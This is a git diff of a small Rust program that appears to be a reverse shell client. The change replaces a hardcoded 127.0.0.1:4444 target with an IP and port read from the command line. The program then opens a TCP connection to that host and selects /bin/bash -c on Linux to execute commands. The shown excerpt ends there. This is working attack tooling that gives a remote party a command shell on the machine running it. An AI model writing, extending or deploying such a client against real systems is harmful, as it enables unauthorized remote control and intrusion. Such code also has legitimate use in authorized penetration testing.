@@ -1,20 +1,28 @@
-use std::str;
-use std::env::consts::OS;
+use std::net::Ipv4Addr;
+use std::str::{self, FromStr};
+use std::env::{self,consts::OS};
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::Command;
-
-// TODO: cmdline args for IP PORT and SHELL
-
 
 struct CMD {
     shell: String,
     arg: String,
 }
 
+fn parse_args(args: &[String]) -> (Ipv4Addr, &str) {
+    let ip = Ipv4Addr::from_str(&args[1]).unwrap();
+    let port = &args[2];
+    (ip, port)
+}
+
+
 
 fn main() {
-    let mut stream = TcpStream::connect("127.0.0.1:4444")
+    let args: Vec<String> = env::args().collect();
+    let (ip, port) = parse_args(&args);
+
+    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))
                                 .expect("Couldn't connect to the server...");
     let cmd = match OS {
                 "linux" => CMD {shell: "/bin/bash".to_string(), arg: "-c".to_string()},
